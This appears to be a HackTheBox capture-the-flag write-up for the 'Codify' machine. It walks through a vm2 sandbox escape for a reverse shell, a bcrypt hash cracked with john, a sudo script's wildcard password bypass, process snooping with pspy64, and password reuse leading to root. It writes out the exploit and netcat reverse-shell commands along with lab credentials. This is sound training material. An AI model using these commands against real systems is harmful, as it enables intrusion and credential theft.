## Hello everyone!

Today, we will explore “*Codify*”, an easy Linux machine from **HackTheBox**.

Without further ado, let’s get started!



![image](/HTB/Codify/Codify_images/1.png)



(Please ensure that you have added the following line  `TARGET_IP     codify.htb` to your local `/etc/hosts` file)


## Information Gathering




First, we will perform an aggressive **Nmap** scan to obtain comprehensive results:



![image](/HTB/Codify/Codify_images/2.png)



We can identify three open ports:

**22** (**SSH (**OpenSSH 8.9p1))

**80** (**HTTP** \ Apache/2.4.52)

**3000** (**HTTP** \ Node.js Express framework)

We can start by inspecting the website hosted on port **80**:



![image](/HTB/Codify/Codify_images/3.png)



It seems that the website allows us to test some Node.js code in a **sandboxed environment**. We can learn from the `/about` **page that the application use a sandboxing library named `vm2`:



![image](/HTB/Codify/Codify_images/4.png)



## Initial Access



Since the library is part of the website’s technology stack, we can consider searching for potential vulnerabilities related to it:


![image](/HTB/Codify/Codify_images/5.png)



A PoC targeting the **vm2 library** before **3.9.17** exists. We can identify a GitHub repository which hosts a **Python script** we can use to achieve **remote code execution** (RCE). We can download the script and execute it with the `-h` switch to obtain more information about its usage:



![image](/HTB/Codify/Codify_images/6.png)



We need to set up a **Netcat listener** and use this script to get a reverse shell. We have to provide the target URL, our local IP, and the port we assigned to our listener. Ensure to do this using `nc -lvnp PORT` in another terminal.

We will execute the following command:

`python3 exploit.py —-url http://codify.htb:3000/run --lhost YOUR_IP --lport NC_PORT`

(Make sure to specify the `/run` endpoint in the target URL or it will not work)



![image](/HTB/Codify/Codify_images/7.png)



We successfully obtained initial access as the user **svc**!

We can stabilize our shell using the following commands:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

There is nothing particularly interesting in the `/home/svc` directory and we can’t run `sudo -l` as we don’t have the password for the user **svc**. We will need to perform **horizontal privilege escalation** to retrieve the user flag.

We can start by inspecting the `/etc/passwd` file to see whether there is other users on the system we can pivot our access to:



![image](/HTB/Codify/Codify_images/8.png)



We identified another user on the system: **joshua**.

Can we access their `/home/joshua` directory?



![image](/HTB/Codify/Codify_images/9.png)



We can’t. We need to find a way to elevate our privileges to **joshua**.



## Horizontal Privilege Escalation



After performing basic local enumeration, we can find a very interesting file in the `/var/www/contact` directory.

![image](/HTB/Codify/Codify_images/10.png)

We found a bcrypt hash for the user **joshua** in a database configuration file! Has the hashed password been reused through SSH? To confirm that, we need to crack the hash, although **bcrypt** is relatively slow. We can attempt it using **john**.

Let’s paste the hash into a `hash.txt` file and pass it to John with the following command:

`john —-format=bcrypt —-wordlist=/usr/share/wordlists/rockyou.txt hash.txt`



![image](/HTB/Codify/Codify_images/11.png)



After a few minutes, John successfully cracked the hash! We discovered the `spongebob1` password for **joshua**. We can attempt to log in via SSH using the following credentials:

`joshua : spongebob1`



![image](/HTB/Codify/Codify_images/12.png)



It works! The password has been reused, it allowed us to pivot our access to **joshua**.

We can now navigate to our current directory and fetch the first flag:



![image](/HTB/Codify/Codify_images/13.png)



## Vertical Privilege Escalation




Now, we need to escalate our privileges to **root** in order to retrieve the last flag.

We can start our local enumeration for privilege escalation paths by checking whether we can execute commands as root via `sudo -l`:



![image](/HTB/Codify/Codify_images/14.png)



It looks like we can execute the `mysql-backup.sh` Bash script with **root privileges**.

Instinctively, we want to check whether this script is writable by us, because if it’s the case, we can modify a script that we can then run as **root**, which could be very critical in a security perspective. Let’s check this by running `ls -ld /opt/scripts/mysql-backup.sh`



![image](/HTB/Codify/Codify_images/15.png)



Unfortunately, it’s not that easy… However we can read and execute the script, so let’s check its content:



![image](/HTB/Codify/Codify_images/16.png)



The script prompts us to enter the root password, after which it performs a backup of the database configuration of the root user. After attempting tricking the prompt, we obtain something very interesting when we provide a **wildcard character** (`*`):



![image](/HTB/Codify/Codify_images/17.png)



The wildcard is interpreted as the valid password, which consequentely performed a backup as the script expected to do. Referring to the script, we know that a `$db.sql.gz` archive is created in the `/var/backups/mysql` directory. Unfortunately, we can’t access it. 

We can observe that the script executes a `mysqldump` command using the `$DB_PASS` variable as the **root’s MySQL password**. Since we can’t observe the command in real time when the script is executed, let’s see what happens in the background using `pspy64`, a tool which allows us to monitor the running processes and commands. We will open a new terminal, log in again via **SSH** as **joshua** and download the binary which is available here.



![image](/HTB/Codify/Codify_images/18.png)



After giving it execute permissions, we can run it. In parallel, we will execute the backup script again with the wildcard to snoop what happens:



![image](/HTB/Codify/Codify_images/19.png)

![image](/HTB/Codify/Codify_images/20.png)



`pspy64` allowed us to monitor the executed command, which displays directly the cleartext MySQL password for the root user instead of the `$DB_PASS` variable!

Maybe, like for **joshua**, the password has been reused through SSH for the **root** user, so let’s get back to our SSH session and run `su root` to authenticate with the following credentials:

`root : kljh12k3jhaskjh12kjh3`



![image](/HTB/Codify/Codify_images/21.png)



It works! We successfully elevated our privileges by leveraging a **password reuse** weakness, which resulted in a total compromise of the system.

We can now navigate to the `/root` directory and retrieve the final flag:



![image](/HTB/Codify/Codify_images/22.png)



Challenge completed!



![image](/HTB/Codify/Codify_images/23.png)



## Conclusion


This room was very pleasant to complete. We exploited an outdated vulnerable library, we leveraged a vulnerability related to it to achieve remote code execution on the target to obtain an initial access as a restricted user. Then, we pivoted our access to an other user via a weak **password reuse abuse**. We learned that the user was able to run a Bash script as root which was poorly programmed as we were able to bypass the prompt injecting a wildcard. Since we were able to view directly the script, we knew what it was doing in the background when executed successfully. We monitored the script’s behavior using `pspy64` to discover a `mysqldump` command that used the root’s password to authenticate and perform a backup, allowing us to obtain the plaintext password. Finally, we leveraged again a password reuse for the **superuser**, which resulted in a total compromise of the system.

**Thank you for reading!**
